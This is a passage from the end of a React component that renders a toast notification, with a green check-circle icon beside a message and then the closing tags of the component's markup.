          <CheckCircle2 size={16} color="#10b981" />
          <span>{toastMessage}</span>
        </div>
      )}
    </div>
  );
}
